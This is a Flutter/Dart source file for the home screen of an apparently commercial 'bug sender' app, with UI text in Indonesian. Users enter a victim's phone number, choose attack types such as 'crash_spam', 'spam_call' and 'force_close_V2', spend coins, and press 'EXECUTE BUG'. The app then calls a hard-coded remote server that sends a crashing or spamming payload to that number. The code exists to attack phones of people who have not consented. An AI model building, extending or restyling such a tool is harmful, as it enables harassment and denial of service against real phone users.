import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;
  
  final VoidCallback? onCoinUpdated; 

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
    this.onCoinUpdated,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late Animation<Offset> _slideAnimation;
  late AnimationController _pulseController;
  int bCoin = 0;
  int lCoin = 0;
  String selectedBugId = "";

  bool _isSending = false;
  String? _responseMessage;

  // Video Player Variables
  late VideoPlayerController _videoController;
  late ChewieController _chewieController;
  bool _isVideoInitialized = false;
  
  // TEMA VIP CYBERPUNK
  final Color bloodRed = const Color(0xFFB71C1C);
  final Color neonRed = const Color(0xFFFF1744);
  final Color darkBg = const Color(0xFF050505);
  final Color panelBg = const Color(0xFF0A0A0A);

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.08), // turun dikit
      end: const Offset(0, 0),      // balik normal
    ).animate(
      CurvedAnimation(
        parent: _pulseController,
        curve: Curves.easeInOut,
      ),
    );

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    // Initialize video player from assets
    _initializeVideoPlayer();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset(
      'assets/videos/banner.mp4',
    );

    _videoController.initialize().then((_) {
      setState(() {
        _videoController.setVolume(0.1); // Mute dari VideoPlayerController
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true,
          looping: true,
          showControls: false,
          autoInitialize: true,
        );
        _isVideoInitialized = true;
      });
    }).catchError((error) {
      print("Video initialization error: $error");
      setState(() {
        _isVideoInitialized = false;
      });
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug(String coinType) async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert("❌ Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      return;
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final res = await http.get(Uri.parse(
          "http://supermanxnay.xyzraa.biz.id:4136/sendBug?key=$key&target=$target&bug=$selectedBugId&cointype=$coinType"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu ${data['wait'] ?? 'beberapa'} detik.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage = data["message"] ?? "⚠️ Gagal: Terjadi kesalahan pada server.");
      } else {
        setState(() {
          _responseMessage = data["message"] ?? "✅ Berhasil mengirim payload ke $target!";
          bCoin = data["bitcoin"] ?? bCoin;
          lCoin = data["lcoin"] ?? lCoin;
        });
        targetController.clear();

        if (widget.onCoinUpdated != null) {
          widget.onCoinUpdated!();
        }
      }
    } catch (_) {
      setState(() =>
      _responseMessage = "❌ Error: Terjadi kesalahan koneksi. Coba lagi.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  // FUNGSI INI DIBIARKAN UTUH KARENA REQUEST USER (Di-makeover UI-nya aja)
  void _showConfirmationDialog() {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);

    if (target == null) {
      _showAlert("❌ Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      return;
    }

    showDialog(
      context: context,
      barrierColor: Colors.black87,
      builder: (context) => Dialog(
        backgroundColor: panelBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(4), // Tajam
          side: BorderSide(color: neonRed, width: 1.5),
        ),
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: panelBg,
            borderRadius: BorderRadius.circular(4),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              // Warning Icon
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  shape: BoxShape.rectangle, // Kaku
                  border: Border.all(color: neonRed, width: 1.5),
                  color: bloodRed.withOpacity(0.1),
                ),
                child: Icon(
                  Icons.warning_amber_rounded,
                  color: neonRed,
                  size: 40,
                ),
              ),

              const SizedBox(height: 20),

              // Title
              Text(
                "CONFIRM DEPLOYMENT",
                style: TextStyle(
                  color: neonRed,
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'monospace',
                  letterSpacing: 1.5,
                ),
              ),

              const SizedBox(height: 16),

              // Message
              const Text(
                "> SYSTEM REQUIRES 5 B-COIN\n> PROCEED?",
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: Colors.white70,
                  fontSize: 12,
                  fontFamily: 'monospace',
                  height: 1.5,
                ),
              ),

              const SizedBox(height: 16),

              // Target Info
              Container(
                width: double.infinity,
                margin: const EdgeInsets.symmetric(vertical: 12),
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.05),
                  border: Border(left: BorderSide(color: neonRed, width: 4)),
                ),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text("TARGET_NODE:", style: TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace')),
                    const SizedBox(height: 4),
                    Text(
                      target,
                      style: TextStyle(
                        color: neonRed,
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'monospace',
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 24),

              // Buttons
              Row(
                children: [
                  // No Button
                  Expanded(
                    child: OutlinedButton(
                      onPressed: () => Navigator.pop(context),
                      style: OutlinedButton.styleFrom(
                        side: const BorderSide(color: Colors.white24),
                        padding: const EdgeInsets.symmetric(vertical: 14),
                        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
                      ),
                      child: const Text(
                        "BATAL",
                        style: TextStyle(
                          fontWeight: FontWeight.bold,
                          fontSize: 14,
                          fontFamily: 'monospace',
                          color: Colors.white54,
                        ),
                      ),
                    ),
                  ),

                  const SizedBox(width: 16),

                  // Yes Button
                  Expanded(
                    child: AnimatedBuilder(
                      animation: _pulseController,
                      builder: (context, child) {
                        return Container(
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(4),
                            color: neonRed.withOpacity(0.8),
                            boxShadow: [
                              BoxShadow(
                                color: neonRed.withOpacity(0.4 * _pulseController.value),
                                blurRadius: 15 * _pulseController.value,
                                spreadRadius: 2 * _pulseController.value,
                              ),
                            ],
                          ),
                          child: ElevatedButton(
                            onPressed: () {
                              Navigator.pop(context);
                              _sendBug("bitcoin");
                            },
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.transparent,
                              shadowColor: Colors.transparent,
                              padding: const EdgeInsets.symmetric(vertical: 14),
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
                            ),
                            child: const Text(
                              "GUNAKAN",
                              style: TextStyle(
                                fontWeight: FontWeight.bold,
                                fontSize: 14,
                                fontFamily: 'monospace',
                                color: Colors.white,
                              ),
                            ),
                          ),
                        );
                      },
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: panelBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4), side: BorderSide(color: neonRed, width: 1.5)),
        title: Text(title, style: TextStyle(color: neonRed, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
        content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'monospace', fontSize: 12)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("DISMISS", style: TextStyle(color: Colors.redAccent, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  Widget _buildHeaderPanel() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: panelBg.withOpacity(0.8),
        border: Border(left: BorderSide(color: neonRed, width: 4)),
      ),
      child: Row(
        children: [
          FadeTransition(
            opacity: Tween(begin: 0.5, end: 1.0).animate(_fadeController),
            child: Container(
              width: 50, height: 50,
              decoration: BoxDecoration(
                shape: BoxShape.rectangle, // Kotak tajam
                border: Border.all(color: neonRed),
                image: const DecorationImage(image: AssetImage('assets/images/logo.jpg'), fit: BoxFit.cover),
              ),
            ),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Text(
                  "USER NAME // ${widget.username.toUpperCase()}", 
                  style: const TextStyle(color: Colors.white, fontFamily: 'monospace', fontWeight: FontWeight.w900, fontSize: 16, letterSpacing: 1.5)
                ),
                const SizedBox(height: 6),
                Text(
                  "ROLLER: [${widget.role.toUpperCase()}] • EXP: ${widget.expiredDate}", 
                  style: const TextStyle(color: Colors.white54, fontFamily: 'monospace', fontSize: 10)
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildVideoPlayer() {
    if (!_isVideoInitialized) {
      return Container(
        width: double.infinity,
        height: 150,
        margin: const EdgeInsets.symmetric(vertical: 10),
        decoration: BoxDecoration(color: panelBg, border: Border.all(color: Colors.white12)),
        child: const Center(
          child: CircularProgressIndicator(color: Colors.redAccent),
        ),
      );
    }

    return Container(
      width: double.infinity,
      margin: const EdgeInsets.symmetric(vertical: 20),
      decoration: BoxDecoration(
        border: Border.all(color: neonRed.withOpacity(0.5), width: 1.5),
        boxShadow: [
          BoxShadow(
            color: bloodRed.withOpacity(0.3),
            blurRadius: 20,
            spreadRadius: 2,
          ),
        ],
      ),
      child: Stack(
        children: [
          AspectRatio(
            aspectRatio: _videoController.value.aspectRatio,
            child: Chewie(controller: _chewieController),
          ),
          // BINGKAI KAMERA CCTV / TARGET LOCK
          Positioned.fill(
            child: IgnorePointer(
              child: CustomPaint(
                painter: CrosshairPainter(color: neonRed.withOpacity(0.4)),
              ),
            ),
          ),
          Positioned(
            top: 8, left: 8,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
              color: neonRed.withOpacity(0.8),
              child: const Text("REC // TARGET_LOCK", style: TextStyle(color: Colors.black, fontSize: 8, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
            ),
          )
        ],
      ),
    );
  }

  IconData _getBugIcon(String bugId) {
    switch (bugId) {
      case "crash_spam": return Icons.electric_bolt;
      case "spam_call": return Icons.phone_callback;
      case "hard": return Icons.warning_amber_rounded;
      case "cxinv": return Icons.blur_on;
      case "click": return Icons.ads_click;
      case "android": return Icons.android;
      case "invisible": return Icons.hourglass_bottom;
      case "ios_invis": return Icons.phone_iphone;
      case "ios_noinvis": return Icons.mobile_off;
      case "force_close_V2": return Icons.power_settings_new;
      default: return Icons.bug_report;
    }
  }

  Widget _buildInputPanel() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: panelBg.withOpacity(0.8),
        border: Border.all(color: Colors.white12),
        borderRadius: BorderRadius.circular(4),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const Text(
            "// MASUKAN TARGET ANDA",
            style: TextStyle(color: Colors.white54, fontFamily: 'monospace', fontSize: 12, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 10),
          TextField(
            controller: targetController,
            style: TextStyle(color: neonRed, fontFamily: 'monospace', fontWeight: FontWeight.bold, fontSize: 16, letterSpacing: 2),
            cursorColor: neonRed,
            keyboardType: TextInputType.phone,
            decoration: InputDecoration(
              hintText: "e.g., +62xxxxxxxxxx",
              hintStyle: const TextStyle(color: Colors.white24, letterSpacing: 1, fontFamily: 'monospace'),
              filled: true,
              fillColor: Colors.black,
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(4),
                borderSide: const BorderSide(color: Colors.white12),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(4),
                borderSide: const BorderSide(color: Colors.white12),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(4),
                borderSide: BorderSide(color: neonRed),
              ),
              prefixIcon: Icon(Icons.radar, color: neonRed, size: 20),
            ),
          ),
          const SizedBox(height: 24),
          const Text(
            "// PILIH TYPE BUG",
            style: TextStyle(color: Colors.white54, fontFamily: 'monospace', fontSize: 12, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 10),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16),
            decoration: BoxDecoration(
              color: Colors.black,
              borderRadius: BorderRadius.circular(4),
              border: Border.all(color: Colors.white12),
            ),
            child: DropdownButtonHideUnderline(
              child: DropdownButton<String>(
                dropdownColor: panelBg,
                value: selectedBugId.isNotEmpty ? selectedBugId : null,
                isExpanded: true,
                icon: Icon(Icons.arrow_drop_down, color: neonRed),
                style: const TextStyle(color: Colors.white, fontFamily: 'monospace'),
                items: widget.listBug.map((bug) {
                  return DropdownMenuItem<String>(
                    value: bug['bug_id'],
                    child: Row(
                      children: [
                        Icon(
                          _getBugIcon(bug['bug_id']), 
                          color: neonRed,
                          size: 18,
                        ),
                        const SizedBox(width: 12),
                        Expanded(
                          child: Text(
                            bug['bug_name'].toString().toUpperCase(),
                            style: const TextStyle(
                              fontSize: 12, 
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1,
                            ),
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                      ],
                    ),
                  );
                }).toList(),
                onChanged: (value) {
                  setState(() {
                    selectedBugId = value ?? "";
                  });
                },
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSendButton() {
    return SlideTransition(
      position: _slideAnimation,
      child: AnimatedBuilder(
        animation: _pulseController,
        builder: (context, child) {
          return Container(
            width: double.infinity,
            height: 60,
            margin: const EdgeInsets.only(top: 16),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(4),
              color: _isSending ? Colors.transparent : bloodRed.withOpacity(0.8),
              border: Border.all(color: neonRed, width: _isSending ? 1 : 1.5),
              boxShadow: _isSending ? [] : [
                BoxShadow(
                  color: neonRed.withOpacity(0.4 * _pulseController.value),
                  blurRadius: 20 * _pulseController.value,
                  spreadRadius: 2 * _pulseController.value,
                ),
              ],
            ),
            // 🔥 LOGIC TOMBOL ASLI LU GAK ADA YANG DIHAPUS
            child: ElevatedButton(
              onPressed: _isSending
                  ? null
                  : () async {
                      String selectedCoin = "bitcoin"; // bitcoin | lcoin

                      final ok = await showDialog<bool>(
                        context: context,
                        barrierDismissible: true,
                        builder: (dialogContext) {
                          return StatefulBuilder(
                            builder: (context, setDialogState) {
                              // TAMPILAN DIALOG KITA UBAH JADI CYBERPUNK
                              return AlertDialog(
                                backgroundColor: panelBg,
                                shape: RoundedRectangleBorder(
                                  borderRadius: BorderRadius.circular(4),
                                  side: const BorderSide(
                                    color: Color(0xFFFF1744),
                                    width: 1.5,
                                  ),
                                ),
                                contentPadding: const EdgeInsets.fromLTRB(20, 20, 20, 10),
                                content: Column(
                                  mainAxisSize: MainAxisSize.min,
                                  children: [
                                    Icon(
                                      selectedCoin == "bitcoin"
                                          ? Icons.currency_bitcoin
                                          : Icons.diamond_outlined,
                                      size: 56,
                                      color: selectedCoin == "bitcoin" ? const Color(0xFFFFC107) : const Color(0xFF2979FF),
                                    ),
                                    const SizedBox(height: 12),
                                    const Text(
                                      "SELECT ASSET",
                                      style: TextStyle(
                                        color: Colors.white,
                                        fontSize: 16,
                                        fontWeight: FontWeight.bold,
                                        fontFamily: 'monospace',
                                      ),
                                    ),
                                    const SizedBox(height: 12),

                                    // ===== PILIH COIN =====
                                    Row(
                                      children: [
                                        Expanded(
                                          child: ChoiceChip(
                                            label: const Text("B-COIN", style: TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
                                            selected: selectedCoin == "bitcoin",
                                            selectedColor: const Color(0xFFFFC107).withOpacity(0.5),
                                            backgroundColor: Colors.transparent,
                                            side: BorderSide(color: selectedCoin == "bitcoin" ? const Color(0xFFFFC107) : Colors.white12),
                                            onSelected: (_) {
                                              setDialogState(() {
                                                selectedCoin = "bitcoin";
                                              });
                                            },
                                          ),
                                        ),
                                        const SizedBox(width: 10),
                                        Expanded(
                                          child: ChoiceChip(
                                            label: const Text("L-COIN", style: TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
                                            selected: selectedCoin == "lcoin",
                                            selectedColor: const Color(0xFF2979FF).withOpacity(0.5),
                                            backgroundColor: Colors.transparent,
                                            side: BorderSide(color: selectedCoin == "lcoin" ? const Color(0xFF2979FF) : Colors.white12),
                                            onSelected: (_) {
                                              setDialogState(() {
                                                selectedCoin = "lcoin";
                                              });
                                            },
                                          ),
                                        ),
                                      ],
                                    ),

                                    const SizedBox(height: 14),
                                    Text(
                                      "> SYSTEM REQUIRES 5 ${selectedCoin == "bitcoin" ? "B-COIN" : "L-COIN"}",
                                      textAlign: TextAlign.center,
                                      style: const TextStyle(
                                        color: Colors.white54,
                                        fontFamily: 'monospace',
                                        fontSize: 11,
                                      ),
                                    ),
                                  ],
                                ),
                                actions: [
                                  OutlinedButton(
                                    onPressed: () => Navigator.pop(dialogContext, false),
                                    style: OutlinedButton.styleFrom(
                                      side: const BorderSide(color: Colors.white24),
                                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
                                    ),
                                    child: const Text("BATAL", style: TextStyle(fontFamily: 'monospace', color: Colors.white54, fontWeight: FontWeight.bold)),
                                  ),
                                  ElevatedButton(
                                    onPressed: () => Navigator.pop(dialogContext, true),
                                    style: ElevatedButton.styleFrom(
                                      backgroundColor: const Color(0xFFFF1744).withOpacity(0.8),
                                      foregroundColor: Colors.white,
                                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
                                    ),
                                    child: const Text("GUNAKAN", style: TextStyle(fontFamily: 'monospace', fontWeight: FontWeight.bold)),
                                  ),
                                ],
                              );
                            },
                          );
                        },
                      );

                      if (ok != true) return;
                      await _sendBug(selectedCoin);
                    },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.transparent,
                shadowColor: Colors.transparent,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
              ),
              child: _isSending
                  ? const SizedBox(
                      height: 24,
                      width: 24,
                      child: CircularProgressIndicator(
                        color: Color(0xFFFF1744),
                        strokeWidth: 2,
                      ),
                    )
                  : Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: const [
                        Icon(Icons.warning, color: Colors.black, size: 20),
                        SizedBox(width: 12),
                        Text(
                          "EXECUTE BUG",
                          style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.bold,
                            fontSize: 16,
                            letterSpacing: 3,
                            fontFamily: 'monospace',
                          ),
                        ),
                      ],
                    ),
            ),
          );
        },
      ),
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();
    
    bool isSuccess = _responseMessage!.contains('✅') || _responseMessage!.contains('SUCCESS');
    Color msgColor = isSuccess ? Colors.greenAccent : neonRed;

    return Container(
      margin: const EdgeInsets.only(top: 24),
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: panelBg,
        border: Border(
          left: BorderSide(color: msgColor, width: 4), 
          top: const BorderSide(color: Colors.white12), 
          bottom: const BorderSide(color: Colors.white12), 
          right: const BorderSide(color: Colors.white12)
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text("SYSTEM LOG", style: TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace')),
          const SizedBox(height: 6),
          Text(
            _responseMessage!,
            style: TextStyle(
              color: msgColor,
              fontWeight: FontWeight.bold,
              fontFamily: 'monospace',
              fontSize: 12,
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    // GAK MENGHILANGKAN SCAFFOLD SEPERTI YANG LU MINTA
    // Cuma diganti colornya dan ditambah padding bawah
    return Scaffold(
      backgroundColor: Colors.transparent, // Biar background dashboard utama keliatan
      body: Stack(
        children: [
          Positioned.fill(child: IgnorePointer(child: CustomPaint(painter: GridPainter()))),
          Positioned.fill(child: IgnorePointer(child: CustomPaint(painter: ScanlinePainter()))),
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.only(left: 20, right: 20, top: 28, bottom: 120), // Bottom padding anti nabrak nav
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  _buildHeaderPanel(),
                  _buildVideoPlayer(),
                  _buildInputPanel(),
                  const SizedBox(height: 10),
                  _buildSendButton(),
                  _buildResponseMessage(),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ========================================================
// CUSTOM PAINTERS FOR CYBERPUNK EFFECTS
// ========================================================
class CrosshairPainter extends CustomPainter {
  final Color color;
  CrosshairPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 1.5
      ..style = PaintingStyle.stroke;
      
    double cx = size.width / 2;
    double cy = size.height / 2;
    double len = 20.0;

    canvas.drawLine(Offset(cx - len, cy), Offset(cx - 5, cy), paint);
    canvas.drawLine(Offset(cx + len, cy), Offset(cx + 5, cy), paint);
    canvas.drawLine(Offset(cx, cy - len), Offset(cx, cy - 5), paint);
    canvas.drawLine(Offset(cx, cy + len), Offset(cx, cy + 5), paint);
    
    double bLen = 15.0;
    canvas.drawLine(const Offset(0, 0), Offset(bLen, 0), paint);
    canvas.drawLine(const Offset(0, 0), Offset(0, bLen), paint);
    canvas.drawLine(Offset(size.width, 0), Offset(size.width - bLen, 0), paint);
    canvas.drawLine(Offset(size.width, 0), Offset(size.width, bLen), paint);
    canvas.drawLine(Offset(0, size.height), Offset(bLen, size.height), paint);
    canvas.drawLine(Offset(0, size.height), Offset(0, size.height - bLen), paint);
    canvas.drawLine(Offset(size.width, size.height), Offset(size.width - bLen, size.height), paint);
    canvas.drawLine(Offset(size.width, size.height), Offset(size.width, size.height - bLen), paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.red.withOpacity(0.03)..strokeWidth = 1.0;
    const double gridSize = 40.0;
    for (double x = 0; x < size.width; x += gridSize) canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    for (double y = 0; y < size.height; y += gridSize) canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
  }
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class ScanlinePainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = Colors.black.withOpacity(0.3)..strokeWidth = 2.0;
    for (double i = 0; i < size.height; i += 4.0) canvas.drawLine(Offset(0, i), Offset(size.width, i), paint);
  }
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}


